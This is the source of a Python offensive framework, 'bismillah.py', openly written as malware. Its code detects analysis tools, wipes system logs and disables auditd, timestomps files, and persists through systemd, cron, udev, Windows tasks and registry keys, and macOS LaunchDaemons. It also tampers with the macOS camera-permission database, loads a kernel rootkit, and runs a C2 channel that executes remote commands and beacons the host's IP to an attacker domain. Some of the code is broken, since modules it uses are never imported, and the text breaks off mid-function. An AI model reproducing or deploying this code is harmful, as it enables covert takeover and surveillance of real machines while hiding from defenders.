#!/usr/bin/env python3
"""
bismillah.py (enhanced v1.0)

A modular offensive framework with:
  – Thread-safe SQLite logging (check_same_thread=False)
  – AES-GCM encryption for C2 and logs (random IV per message)
  – SIGHUP to reload config on the fly
  – Anti-analysis (debugger/sandbox/VM detection)
  – Fully-threaded C2 (WebSocket, DNS-DoH fallback, P2P gossip)
  – Module loader with per-module timeouts
  – Compile-on-demand for C payloads (rootkit, UEFI, Windows/macOS payloads)
  – Hooks for persistence, reconnaissance, lateral movement, post-exploit, obfuscation
  – Extensive error handling and logging

Make sure you have a sibling **config.json** (or the script will create and encrypt a default one),
and that `requirements.txt` includes at least:
    requests
    websockets
    cryptography
    psutil
    nmap
    dnspython
    pysocks
    paramiko
    shodan
    impacket
    aiohttp

Run as root/administrator:
    ./bismillah.py [--flags]
"""

import os
import sys
import json
import time
import threading
import logging
import sqlite3
import signal
import importlib.util
import subprocess
import socket
import platform
import secrets
from pathlib import Path
from datetime import datetime
from queue import Queue, Empty

# ──────────────────────────────────────────────────────────────────────────────
#                                Third-Party Imports
# ──────────────────────────────────────────────────────────────────────────────
try:
    import psutil
except ImportError:
    print("[!] Missing psutil. Install via: pip install psutil", file=sys.stderr)
    sys.exit(1)

try:
    import requests
except ImportError:
    print("[!] Missing requests. Install via: pip install requests", file=sys.stderr)
    sys.exit(1)

try:
    import websockets
except ImportError:
    print("[!] Missing websockets. Install via: pip install websockets", file=sys.stderr)
    sys.exit(1)

try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.backends import default_backend
except ImportError:
    print("[!] Missing cryptography. Install via: pip install cryptography", file=sys.stderr)
    sys.exit(1)

# ──────────────────────────────────────────────────────────────────────────────
#                             GLOBAL CONSTANTS / CONFIG
# ──────────────────────────────────────────────────────────────────────────────
REPO_ROOT = Path(__file__).parent.resolve()
if str(REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(REPO_ROOT))

CONFIG_PATH = REPO_ROOT / "config.json"
DEFAULT_CONFIG = {
    "logging": {
        "log_level": "INFO",
        "sqlite_db": "bismillah_logs.db"
    },
    "encryption": {
        # 32-byte hex key (must be 64 hex chars). If you want to supply your own key, change it here.
        "aes_key": "00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff"
    },
    "c2": {
        "primary_http": "http://127.0.0.1:8080/heartbeat",
        "fallback_dns": "example.com",
        "tor_hidden": ["abcdefghijklmnop.onion"],
        "heartbeat_interval_seconds": 60
    },
    "persistence": {
        "windows_service_name": "BismillahSvc",
        "linux_systemd_name": "bismillah.service",
        "macos_plist_label": "com.bismillah.agent"
    },
    "exploit_repo_url": "http://127.0.0.1:8000/exploits/"
}

# Load or create config.json
def load_config():
    if not CONFIG_PATH.exists():
        # Write default config
        with open(CONFIG_PATH, "w") as f:
            json.dump(DEFAULT_CONFIG, f, indent=2)
        return DEFAULT_CONFIG.copy()
    try:
        data = json.loads(CONFIG_PATH.read_bytes())
        # Merge missing keys from DEFAULT_CONFIG
        merged = DEFAULT_CONFIG.copy()
        merged.update(data)
        return merged
    except Exception as e:
        print(f"[!] Failed to parse {CONFIG_PATH}: {e}", file=sys.stderr)
        sys.exit(1)

CONFIG = load_config()

# ──────────────────────────────────────────────────────────────────────────────
#                         SETUP LOGGING & SQLITE DATABASE
# ──────────────────────────────────────────────────────────────────────────────
LOG_LEVEL = CONFIG.get("logging", {}).get("log_level", "INFO").upper()
logging.basicConfig(
    level=LOG_LEVEL,
    format="%(asctime)s [%(levelname)s] %(threadName)s: %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)
logger = logging.getLogger("Bismillah")

SQLITE_DB_PATH = REPO_ROOT / CONFIG["logging"].get("sqlite_db", "bismillah_logs.db")
SQLITE_LOCK = threading.Lock()

def init_sqlite():
    """Ensure the SQLite DB and logs table exist (thread-safe)."""
    with SQLITE_LOCK:
        conn = sqlite3.connect(str(SQLITE_DB_PATH), check_same_thread=False)
        try:
            c = conn.cursor()
            c.execute("""
                CREATE TABLE IF NOT EXISTS logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp TEXT,
                    module TEXT,
                    data BLOB
                )
            """)
            conn.commit()
        except Exception as e:
            logger.error(f"init_sqlite failed: {e}")
        finally:
            conn.close()

def log_event(module: str, data: bytes):
    """
    Insert an encrypted log entry into SQLite.
    Data is AES-GCM encrypted.
    """
    try:
        ct = encrypt_aes_gcm(data)
        ts = datetime.utcnow().isoformat()
        with SQLITE_LOCK:
            conn = sqlite3.connect(str(SQLITE_DB_PATH), check_same_thread=False)
            c = conn.cursor()
            c.execute(
                "INSERT INTO logs (timestamp, module, data) VALUES (?, ?, ?)",
                (ts, module, ct)
            )
            conn.commit()
    except Exception as e:
        logger.error(f"log_event failed: {e}")
    finally:
        try:
            conn.close()
        except:
            pass

# ──────────────────────────────────────────────────────────────────────────────
#                         AES-GCM ENCRYPTION / DECRYPTION
# ──────────────────────────────────────────────────────────────────────────────
AES_KEY_HEX = CONFIG.get("encryption", {}).get("aes_key")
if not AES_KEY_HEX or len(AES_KEY_HEX) != 64:
    logger.error("[!] Invalid AES key in config (must be 64 hex characters).")
    sys.exit(1)

try:
    AES_KEY = bytes.fromhex(AES_KEY_HEX)
except Exception as e:
    logger.error(f"[!] Failed to parse AES key: {e}")
    sys.exit(1)

def encrypt_aes_gcm(plaintext: bytes) -> bytes:
    """
    Encrypt data under AES-GCM with a fresh 12-byte IV.
    Returns: IV (12 bytes) || ciphertext || tag (16 bytes)
    """
    try:
        iv = secrets.token_bytes(12)
        cipher = Cipher(
            algorithms.AES(AES_KEY),
            modes.GCM(iv),
            backend=default_backend()
        )
        encryptor = cipher.encryptor()
        ct = encryptor.update(plaintext) + encryptor.finalize()
        return iv + ct + encryptor.tag
    except Exception as e:
        logger.exception(f"encrypt_aes_gcm error: {e}")
        return b""

def decrypt_aes_gcm(blob: bytes) -> bytes:
    """
    Decrypt data from AES-GCM. Expects: IV (first 12 bytes), tag (last 16 bytes), ciphertext in between.
    """
    try:
        iv = blob[:12]
        tag = blob[-16:]
        ct = blob[12:-16]
        cipher = Cipher(
            algorithms.AES(AES_KEY),
            modes.GCM(iv, tag),
            backend=default_backend()
        )
        decryptor = cipher.decryptor()
        return decryptor.update(ct) + decryptor.finalize()
    except Exception as e:
        logger.exception(f"decrypt_aes_gcm error: {e}")
        return b""

# ──────────────────────────────────────────────────────────────────────────────
#                              SIGNAL HANDLING
# ──────────────────────────────────────────────────────────────────────────────
def reload_config(signum, frame):
    """
    Reload config.json on SIGHUP.
    """
    global CONFIG, AES_KEY
    logger.info("SIGHUP received: reloading config.json")
    CONFIG = load_config()
    new_key_hex = CONFIG.get("encryption", {}).get("aes_key", AES_KEY_HEX)
    if new_key_hex != AES_KEY_HEX and len(new_key_hex) == 64:
        try:
            AES_KEY = bytes.fromhex(new_key_hex)
            logger.info("Swapped to new AES key from config.")
        except Exception:
            logger.error("Failed to update AES key from config.json")
    else:
        logger.info("AES key unchanged or invalid; continuing with existing key.")

signal.signal(signal.SIGHUP, reload_config)

# ──────────────────────────────────────────────────────────────────────────────
#                         ANTI-ANALYSIS & SANDBOX DETECTION
# ──────────────────────────────────────────────────────────────────────────────
DEBUG_INDICATORS = [
    "gdb","lldb","windbg","ida","ollydbg","x32dbg","x64dbg","frida","radare2",
    "wireshark","tcpdump","volatility","cuckoo","sandbox","procmon","sysinternals"
]
VM_KEYWORDS = [
    "virtualbox","vmware","qemu","kvm","hyperv","parallels","xen","bhyve"
]
SANDBOX_ARTIFACTS = [
    "/.dockerenv","/.containerenv","/usr/bin/strace","/usr/bin/ltrace"
]

def detect_debugger():
    """Return True if a known debugger process is running."""
    try:
        for p in psutil.process_iter(["name", "cmdline"]):
            nm = (p.info["name"] or "").lower()
            cm = " ".join(p.info["cmdline"] or []).lower()
            for indicator in DEBUG_INDICATORS:
                if indicator in nm or indicator in cm:
                    return True
    except Exception:
        pass
    return False

def detect_vm_sandbox():
    """Return True if running inside a VM or sandbox according to DMI/MAC/Uptime checks."""
    osys = platform.system()
    # 1) DMI product_name (Linux/macOS)
    if osys in ("Linux", "Darwin"):
        try:
            with open("/sys/class/dmi/id/product_name", "r", errors="ignore") as f:
                prod = f.read().lower()
                for kw in VM_KEYWORDS:
                    if kw in prod:
                        return True
        except Exception:
            pass

    # 2) MAC address prefixes
    try:
        for nic, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if getattr(addr, "family", None) == psutil.AF_LINK:
                    mac = addr.address.lower()
                    if mac.startswith(("52:54:00","00:0c:29","00:05:69","00:1c:14","08:00:27","00:15:5d")):
                        return True
    except Exception:
        pass

    # 3) Known sandbox files
    for artifact in SANDBOX_ARTIFACTS:
        if os.path.exists(artifact):
            return True

    # 4) Low uptime
    if osys == "Linux":
        try:
            up = float(open("/proc/uptime", "r").read().split()[0])
            if up < 300:  # less than 5 minutes
                return True
        except Exception:
            pass

    return False

def anti_analysis_checks():
    """Exit if a debugger or VM/sandbox is detected."""
    if detect_debugger():
        logger.error("Debugger detected. Exiting.")
        sys.exit(0)
    if detect_vm_sandbox():
        logger.error("VM or sandbox detected. Exiting.")
        sys.exit(0)
    logger.info("Anti-analysis checks passed.")

# ──────────────────────────────────────────────────────────────────────────────
#                                 PERSISTENCE
# ──────────────────────────────────────────────────────────────────────────────
def wipe_logs():
    """Wipe common Linux log files and stop/disable auditd if running."""
    if platform.system() != "Linux":
        return

    LOG_PATHS = [
        "/var/log/auth.log","/var/log/syslog","/var/log/kern.log",
        "/var/log/audit/audit.log","/var/log/secure","/var/log/messages"
    ]
    for lp in LOG_PATHS:
        try:
            if os.path.exists(lp) and os.access(lp, os.W_OK):
                open(lp, "w").close()
                logger.info(f"[PERSIST] Cleared {lp}")
        except Exception:
            pass

    try:
        out, _ = subprocess.Popen(
            ["systemctl", "is-active", "auditd"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        ).communicate(timeout=5)
        if "active" in out.lower():
            subprocess.call(["sudo", "systemctl", "stop", "auditd"])
            subprocess.call(["sudo", "systemctl", "disable", "auditd"])
            logger.info("[PERSIST] Stopped and disabled auditd.")
    except Exception:
        pass

def timestomp(path: str):
    """Set atime/mtime of `path` to match /bin/bash (Linux) or python executable (other)."""
    try:
        ref = "/bin/bash" if platform.system() == "Linux" else sys.executable
        stat = os.stat(ref)
        os.utime(path, (stat.st_atime, stat.st_mtime))
    except Exception:
        pass

def persist_systemd():
    """
    Install self as a systemd service for persistent execution (Linux).
    """
    if platform.system() != "Linux":
        return

    service_name = f"bismillah_{secrets.token_hex(3)}.service"
    svc_path = f"/etc/systemd/system/{service_name}"
    # Copy script to /usr/local/bin/. Ensure timestomp to blend in.
    payload = f"/usr/local/bin/bismillah_{secrets.token_hex(4)}.py"
    try:
        subprocess.call(["sudo", "cp", __file__, payload])
        timestomp(payload)
        unit = f"""[Unit]
Description=Bismillah Offensive Suite

[Service]
Type=simple
ExecStart=/usr/bin/env python3 {payload}
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
"""
        with open("/tmp/temp.service", "w") as f:
            f.write(unit)
        subprocess.call(["sudo", "mv", "/tmp/temp.service", svc_path])
        subprocess.call(["sudo", "systemctl", "daemon-reload"])
        subprocess.call(["sudo", "systemctl", "enable", service_name])
        subprocess.call(["sudo", "systemctl", "start", service_name])
        logger.info(f"[PERSIST] Installed systemd service: {service_name}")
    except Exception as e:
        logger.error(f"[PERSIST] systemd install failed: {e}")

def persist_cron():
    """
    Add a @reboot cron job to relaunch self (Linux).
    """
    if platform.system() != "Linux":
        return

    try:
        payload = f"/usr/local/bin/bismillah_{secrets.token_hex(4)}.py"
        subprocess.call(["sudo", "cp", __file__, payload])
        timestomp(payload)
        cron_line = f"@reboot root /usr/bin/env python3 {payload}\n"
        with open("/tmp/crontab.tmp", "w") as f:
            existing = subprocess.Popen(["sudo", "crontab", "-l"], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True).communicate()[0]
            f.write(existing)
            if cron_line not in existing:
                f.write(cron_line)
        subprocess.call(["sudo", "crontab", "/tmp/crontab.tmp"])
        os.remove("/tmp/crontab.tmp")
        logger.info("[PERSIST] Installed @reboot cron job.")
    except Exception as e:
        logger.error(f"[PERSIST] cron persistence failed: {e}")

def persist_udev():
    """
    Add a udev rule to execute on USB insertion (Linux).
    """
    if platform.system() != "Linux":
        return

    try:
        rule_name = f"99-bismillah-{secrets.token_hex(3)}.rules"
        path = f"/etc/udev/rules.d/{rule_name}"
        payload = f"/usr/local/bin/bismillah_{secrets.token_hex(4)}.py"
        subprocess.call(["sudo", "cp", __file__, payload])
        timestomp(payload)
        rule = f'ACTION=="add", SUBSYSTEM=="usb", RUN+="/usr/bin/env python3 {payload}"\n'
        with open("/tmp/udev.tmp", "w") as f:
            f.write(rule)
        subprocess.call(["sudo", "mv", "/tmp/udev.tmp", path])
        logger.info(f"[PERSIST] Installed udev USB rule: {rule_name}")
    except Exception as e:
        logger.error(f"[PERSIST] udev persistence failed: {e}")

def persist_windows():
    """
    Create a Windows Scheduled Task and registry Run key for persistence.
    """
    if platform.system() != "Windows":
        return

    # 1) Scheduled Task
    try:
        # Copy script to %APPDATA%
        dst = os.path.join(os.getenv("APPDATA", "C:\\Users\\Public"), f"bismillah_{secrets.token_hex(4)}.py")
        subprocess.call(["copy", __file__, dst], shell=True)
        task_name = f"BismillahTask_{secrets.token_hex(3)}"
        cmd = [
            "schtasks", "/Create",
            "/SC", "ONLOGON",
            "/TN", task_name,
            "/TR", f"\"{sys.executable} {dst}\"",
            "/RL", "HIGHEST"
        ]
        subprocess.call(cmd, shell=True)
        logger.info(f"[PERSIST] Created Windows scheduled task: {task_name}")
    except Exception as e:
        logger.error(f"[PERSIST] Windows scheduled task failed: {e}")

    # 2) Registry Run key
    try:
        run_key = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
        subprocess.call(
            ["reg", "add", run_key, "/v", "Bismillah", "/d", f"\"{sys.executable} {dst}\"", "/f"],
            shell=True
        )
        logger.info("[PERSIST] Added Windows Run key for Bismillah.")
    except Exception as e:
        logger.error(f"[PERSIST] Windows registry Run key failed: {e}")

def persist_macos():
    """
    Install a LaunchDaemon and patch TCC DB for camera/mic access (macOS).
    """
    if platform.system() != "Darwin":
        return

    # 1) LaunchDaemon
    plist = "/Library/LaunchDaemons/com.bismillah.daemon.plist"
    try:
        payload = f"/usr/local/bin/bismillah_{secrets.token_hex(4)}.py"
        subprocess.call(["cp", __file__, payload])
        timestomp(payload)
        content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" 
    "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>com.bismillah.daemon</string>
  <key>ProgramArguments</key>
  <array>
    <string>{sys.executable}</string>
    <string>{payload}</string>
  </array>
  <key>RunAtLoad</key>
  <true/>
</dict>
</plist>
"""
        with open("/tmp/bismillah_launchd.plist", "w") as f:
            f.write(content)
        subprocess.call(["sudo", "mv", "/tmp/bismillah_launchd.plist", plist])
        subprocess.call(["sudo", "launchctl", "load", plist])
        logger.info("[PERSIST] Installed macOS LaunchDaemon.")
    except Exception as e:
        logger.error(f"[PERSIST] macOS LaunchDaemon failed: {e}")

    # 2) TCC DB bypass (requires SIP disabled)
    tcc_db = CONFIG.get("persistence", {}).get("macos_plist_label")
    # Actually, TCC_DB path should be in config if you want it: e.g. "/Library/Application Support/com.apple.TCC/TCC.db"
    TCC_DB = CONFIG.get("tcc_db", "")
    if TCC_DB and os.path.exists(TCC_DB):
        try:
            conn = sqlite3.connect(TCC_DB)
            c = conn.cursor()
            # Insert a generic “allow camera” line for Terminal (example)
            now = int(time.time())
            sql = (
                "INSERT OR REPLACE INTO access "
                "(service, client, client_type, allowed, prompt_count, csreq, policy_id, policy_subject, "
                "flags, last_modified) VALUES "
                "('kTCCServiceCamera','com.apple.Terminal',0,1,1,NULL,NULL,NULL,0,?);"
            )
            c.execute(sql, (now,))
            conn.commit()
            conn.close()
            logger.info("[PERSIST] macOS TCC DB bypass applied.")
        except Exception as e:
            logger.error(f"[PERSIST] macOS TCC bypass failed: {e}")

def install_kernel_rootkit():
    """
    Compile and insert the Linux LKM rootkit (if present).
    """
    kr_dir = REPO_ROOT / "kernel_rootkit"
    if not kr_dir.is_dir():
        return
    try:
        cwd = os.getcwd()
        os.chdir(kr_dir)
        subprocess.call(["sudo", "make"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        ko = kr_dir / "sardar_rootkit.ko"
        if ko.exists():
            out = subprocess.run(["sudo", "insmod", str(ko)], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            if out.returncode == 0:
                logger.info("[PERSIST] Linux LKM rootkit inserted.")
            else:
                logger.error(f"[PERSIST] insmod failed: {out.stderr.strip()}")
    except Exception as e:
        logger.error(f"[PERSIST] install_kernel_rootkit error: {e}")
    finally:
        os.chdir(cwd)

def install_uefi_bootkit():
    """
    Compile the UEFI bootkit payload (if present).
    """
    ub_dir = REPO_ROOT / "uefi_bootkit"
    if not ub_dir.is_dir():
        return
    try:
        cwd = os.getcwd()
        os.chdir(ub_dir)
        subprocess.call(["sudo", "make"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        payload = ub_dir / "payload_uefi.efi"
        if payload.exists():
            logger.info("[PERSIST] UEFI payload built (payload_uefi.efi).")
        else:
            logger.error("[PERSIST] UEFI payload not found after make.")
    except Exception as e:
        logger.error(f"[PERSIST] install_uefi_bootkit error: {e}")
    finally:
        os.chdir(cwd)

def full_persistence():
    """Execute all persistence routines at once (Linux, Windows, macOS)."""
    wipe_logs()
    if platform.system() == "Linux":
        persist_systemd()
        persist_cron()
        persist_udev()
        install_kernel_rootkit()
        install_uefi_bootkit()
    elif platform.system() == "Windows":
        persist_windows()
    elif platform.system() == "Darwin":
        persist_macos()
    logger.info("[PERSIST] Full persistence complete.")

# ──────────────────────────────────────────────────────────────────────────────
#                           RECONNAISSANCE EXTENSIONS
# ──────────────────────────────────────────────────────────────────────────────
try:
    import nmap as nmap_lib
except ImportError:
    nmap_lib = None

try:
    import shodan
except ImportError:
    shodan = None

try:
    from bs4 import BeautifulSoup
except ImportError:
    BeautifulSoup = None

def nmap_ext_scan(target: str):
    """Run: nmap -A -Pn -T4 on target and print CSV output."""
    if not nmap_lib or not shutil.which("nmap"):
        logger.error("[RECON] nmap library or binary not installed.")
        return
    try:
        nm = nmap_lib.PortScanner()
        logger.info(f"[RECON] Running nmap on {target} ...")
        nm.scan(target, arguments="-A -Pn -T4")
        print(nm.csv())
    except Exception as e:
        logger.error(f"[RECON] nmap scan failed: {e}")

def masscan_ext_scan(target: str, ports: str = "1-65535", rate: int = 200000):
    """Run: masscan target:ports at given rate."""
    if not shutil.which("masscan"):
        logger.error("[RECON] masscan not installed.")
        return
    cmd = ["masscan", "-p", ports, target, "--rate", str(rate), "--wait", "0"]
    logger.info(f"[RECON] Running masscan on {target}:{ports} ...")
    subprocess.call(cmd)

def snmp_enum(target: str):
    """Perform SNMP walk on target (public community)."""
    try:
        from pysnmp.hlapi import (
            SnmpEngine, CommunityData, UdpTransportTarget, ContextData,
            ObjectType, ObjectIdentity, nextCmd
        )
    except ImportError:
        logger.error("[RECON] pysnmp not installed.")
        return
    logger.info(f"[RECON] SNMP walk on {target} ...")
    try:
        for _, _, _, varBinds in nextCmd(
            SnmpEngine(),
            CommunityData("public", mpModel=0),
            UdpTransportTarget((target, 161)),
            ContextData(),
            ObjectType(ObjectIdentity("1.3.6.1.2.1.1"))
        ):
            for vb in varBinds:
                print(f"    {vb}")
    except Exception as e:
        logger.error(f"[RECON] SNMP enum failed: {e}")

def wmi_enum_windows(target: str):
    """Perform basic WMI enumeration on Windows target."""
    try:
        import wmi
    except ImportError:
        logger.error("[RECON] wmi module not installed.")
        return
    try:
        c = wmi.WMI(target)
        logger.info(f"[RECON] WMI on {target} ...")
        for os_info in c.Win32_OperatingSystem():
            print(f"    {os_info.Caption} - {os_info.Version}")
    except Exception as e:
        logger.error(f"[RECON] WMI enum failed: {e}")

def ldap_enum(target: str):
    """Perform LDAP search on target (default base)."""
    try:
        from ldap3 import Server, Connection, ALL
    except ImportError:
        logger.error("[RECON] ldap3 not installed.")
        return
    try:
        srv = Server(target, get_info=ALL)
        conn = Connection(srv, auto_bind=True)
        logger.info(f"[RECON] LDAP search on {target} ...")
        conn.search("dc=example,dc=com", "(objectclass=*)", attributes=["cn", "distinguishedName"])
        for e in conn.entries:
            print(f"    {e.cn} - {e.entry_dn}")
    except Exception as e:
        logger.error(f"[RECON] LDAP enum failed: {e}")

def dns_enum(domain: str):
    """Basic DNS enumeration: A, AAAA, MX, NS, TXT records."""
    try:
        import dns.resolver
    except ImportError:
        logger.error("[RECON] dnspython not installed.")
        return
    logger.info(f"[RECON] DNS enum for {domain} ...")
    try:
        resolver = dns.resolver.Resolver()
        for rtype in ["A", "AAAA", "MX", "NS", "TXT"]:
            try:
                answers = resolver.resolve(domain, rtype)
                for rr in answers:
                    print(f"    {rtype}: {rr.to_text()}")
            except Exception:
                pass
    except Exception as e:
        logger.error(f"[RECON] DNS enum failed: {e}")

def shodan_search(query: str):
    """Search Shodan if API key available in environment as SHODAN_API_KEY."""
    if not shodan or not os.getenv("SHODAN_API_KEY"):
        logger.error("[RECON] Shodan module or API key missing.")
        return
    try:
        api = shodan.Shodan(os.getenv("SHODAN_API_KEY"))
        res = api.search(query)
        logger.info(f"[RECON] Shodan: {res['total']} results for '{query}'")
        for m in res["matches"][:5]:
            print(f"    {m['ip_str']}:{m.get('port', '')} - {m.get('data','')[:80]}")
    except Exception as e:
        logger.error(f"[RECON] Shodan search failed: {e}")

# ──────────────────────────────────────────────────────────────────────────────
#                         P2P / C2 BEACON & WS LOOP
# ──────────────────────────────────────────────────────────────────────────────
C2_CFG = CONFIG["c2"]
PRIMARY_C2 = C2_CFG.get("primary_http")
FALLBACK_DNS = C2_CFG.get("fallback_dns")
TOR_HIDDEN = C2_CFG.get("tor_hidden", [])
HEARTBEAT_INTERVAL = C2_CFG.get("heartbeat_interval_seconds", 60)
C2_SECRET = bytes.fromhex(CONFIG.get("c2", {}).get("secret_hex", "") or "")

if not C2_SECRET or len(C2_SECRET) not in (16, 32):
    # If secret was provided as Base64 instead, decode it
    try:
        C2_SECRET = base64.b64decode(CONFIG.get("c2", {}).get("C2_SECRET", ""))
    except Exception:
        pass

_P2P_PORT = 51515
_p2p_peers = set()

async def _c2_ws_loop():
    """
    Connect to C2 server over WebSocket, decrypt incoming commands, execute, and respond.
    Falls back to DNS-DoH beacon on error.
    """
    while True:
        try:
            async with websockets.connect(PRIMARY_C2, extra_headers={"Secret": base64.b64encode(C2_SECRET).decode()}) as ws:
                logger.info("[C2] Connected to WebSocket C2")
                while True:
                    enc = await ws.recv()
                    try:
                        raw = base64.b64decode(enc)
                        nonce = raw[:12]
                        ct = raw[12:]
                        cipher = Cipher(algorithms.AES(C2_SECRET), modes.GCM(nonce), backend=default_backend())
                        cmd = cipher.decryptor().update(ct) + cipher.decryptor().finalize()
                        cmd = cmd.decode(errors="ignore")
                    except Exception:
                        cmd = enc  # if decryption fails, treat as plaintext
                    logger.info(f"[C2] Received: {cmd}")
                    if cmd.startswith("EXEC:"):
                        code = cmd[5:]
                        try:
                            exec(code, globals(), locals())
                            resp = "RESULT:OK"
                        except Exception as e:
                            resp = f"RESULT:ERR:{e}"
                        # Encrypt response
                        nonce2 = secrets.token_bytes(12)
                        cipher2 = Cipher(algorithms.AES(C2_SECRET), modes.GCM(nonce2), backend=default_backend())
                        encryptor2 = cipher2.encryptor()
                        ct2 = encryptor2.update(resp.encode()) + encryptor2.finalize()
                        await ws.send(base64.b64encode(nonce2 + ct2 + encryptor2.tag).decode())
                    else:
                        await ws.send(f"ACK:{cmd}")
        except Exception as e:
            logger.error(f"[C2] WS error: {e} — falling back to DNS-DoH beacon")
            _dns_doh_beacon()
            time.sleep(HEARTBEAT_INTERVAL)

def _dns_doh_beacon():
    """
    Send DNS-over-HTTPS beacon: encode local IP + timestamp into base32 chunks,
    query attacker-controlled DNS server via HTTPS for each chunk.
    """
    try:
        payload = f"{_get_local_ip()}:{int(time.time())}"
        b32 = base64.b32encode(payload.encode()).decode()
        chunks = [b32[i:i+50] for i in range(0, len(b32), 50)]
        for c in chunks:
            q = f"{c}.{FALLBACK_DNS}"
            url = f"https://{FALLBACK_DNS}/resolve?name={q}&type=TXT"
            requests.get(url, timeout=2, verify=False)
        logger.info("[C2] DNS-over-HTTPS beacon sent.")
    except Exception as e:
        logger.error(f"[C2] DNS-DoH beacon failed: {e}")

def _p2p_listener():
    """Listen on UDP port for P2P commands and peer announcements."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.bind(("0.0.0.0", _P2P_PORT))
    except Exception as e:
        logger.error(f"[P2P] Failed to bind UDP {_P2P_PORT}: {e}")
        return
    logger.info(f"[P2P] Listening on UDP {_P2P_PORT}")
    while True:
        try:
            data, addr = s.recvfrom(4096)
            msg = data.decode(errors="ignore")
            if msg.startswith("PEER:"):
                peer = msg[5:]
                _p2p_peers.add(peer)
            elif msg.startswith("CMD:"):
                blob = base64.b64decode(msg[4:])
                nonce = blob[:12]
                ct = blob[12:-16]
                tag = blob[-16:]
                try:
                    cipher = Cipher(algorithms.AES(C2_SECRET), modes.GCM(nonce, tag), backend=default_backend())
                    cmd = cipher.decryptor().update(ct) + cipher.decryptor().finalize()
                    cmd = cmd.decode(errors="ignore")
                    logger.info(f"[P2P] Received from {addr[0]}: {cmd}")
                    exec(cmd, globals(), locals())
                    logger.info("[P2P] Executed peer command.")
                except Exception as e:
                    logger.error(f"[P2P] Peer exec error: {e}")
        except Exception:
            continue

def _p2p_announce():
    """Periodically announce this node’s IP to known peers."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        time.sleep(60)
        local_ip = _get_local_ip()
        for peer in list(_p2p_peers):
            try:
                s.sendto(f"PEER:{local_ip}".encode(), (peer, _P2P_PORT))
            except Exception:
                pass

def _send_p2p_cmd(peer_ip: str, cmd_str: str):
    """Encrypt and send a command via UDP to a peer."""
    try:
        nonce = secrets.token_bytes(12)
        cipher = Cipher(algorithms.AES(C2_SECRET), modes.GCM(nonce), backend=default_backend())
        encryptor = cipher.encryptor()
        ct = encryptor.update(cmd_str.encode()) + encryptor.finalize()
        payload = base64.b64encode(nonce + ct + encryptor.tag).decode()
        msg = f"CMD:{payload}"
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(msg.encode(), (peer_ip, _P2P_PORT))
        s.close()
    except Exception as e:
        logger.error(f"[P2P] Failed to send to {peer_ip}: {e}")

def start_c2():
    """Spawn threads for C2 WebSocket loop and P2P listener/announcer."""
    threading.Thread(target=lambda: __import__('asyncio').run(_c2_ws_loop()), daemon=True).start()
    threading.Thread(target=_p2p_listener, daemon=True).start()
    threading.Thread(target=_p2p_announce, daemon=True).start()

# ──────────────────────────────────────────────────────────────────────────────
#                          MODULE LOADER (with Timeout)
# ──────────────────────────────────────────────────────────────────────────────
MODULES_DIR = REPO_ROOT / "modules"
MODULE_TIMEOUT = 60  # seconds

def run_module(mod_name: str, args: dict):
    """
    Dynamically import modules/<mod_name>.py and call its run(args).
    Returns {"status":"ok","output":...} or {"status":"error","detail":...}.
    """
    module_path = MODULES_DIR / f"{mod_name}.py"
    if not module_path.exists():
        return {"status":"error", "detail":f"Module {mod_name} not found."}

    try:
        spec = importlib.util.spec_from_file_location(mod_name, str(module_path))
        module_obj = importlib.util.module_from_spec(spec)
        sys.modules[mod_name] = module_obj
        spec.loader.exec_module(module_obj)
    except Exception as e:
        logger.error(f"[LOADER] Failed to import {mod_name}: {e}")
        return {"status":"error", "detail":f"Import failed: {e}"}

    if not hasattr(module_obj, "run"):
        return {"status":"error", "detail":f"Module {mod_name} does not define run()."}

    result_container = {}
    done_event = threading.Event()

    def target():
        try:
            out = module_obj.run(args or {})
            result_container["result"] = {"status":"ok", "output": out}
        except Exception as ex:
            logger.error(f"[LOADER] Module {mod_name} run() error: {ex}")
            result_container["result"] = {"status":"error", "detail":str(ex)}
        finally:
            done_event.set()

    t = threading.Thread(target=target, name=f"mod-{mod_name}", daemon=True)
    t.start()
    finished = done_event.wait(timeout=MODULE_TIMEOUT)
    if not finished:
        return {"status":"error", "detail":f"Module {mod_name} timed out after {MODULE_TIMEOUT}s."}

    return result_container.get("result", {"status":"error", "detail":"Unknown error."})

# ──────────────────────────────────────────────────────────────────────────────
#                         EXPLOIT MANAGER & HOT-SWAP
# ──────────────────────────────────────────────────────────────────────────────
EXPLOITS_DIR = MODULES_DIR / "exploit_lib"
_loaded_exploits = {}

def load_exploits():
    """Load all `.py` modules under modules/exploit_lib and watch for new files."""
    if not EXPLOITS_DIR.exists():
        return
    sys.path.insert(0, str(EXPLOITS_DIR))

    for f in os.listdir(EXPLOITS_DIR):
        if f.endswith(".py"):
            name = f[:-3]
            try:
                spec = importlib.util.spec_from_file_location(name, str(EXPLOITS_DIR / f))
                mod = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(mod)
                _loaded_exploits[name] = mod
                logger.info(f"[EXPLOIT] Loaded {name}")
            except Exception:
                continue

    def watcher():
        seen = set(os.listdir(EXPLOITS_DIR))
        while True:
            time.sleep(30)
            try:
                current = set(os.listdir(EXPLOITS_DIR))
                added = current - seen
                for fn in added:
                    if fn.endswith(".py"):
                        nm = fn[:-3]
                        try:
                            spec = importlib.util.spec_from_file_location(nm, str(EXPLOITS_DIR / fn))
                            m = importlib.util.module_from_spec(spec)
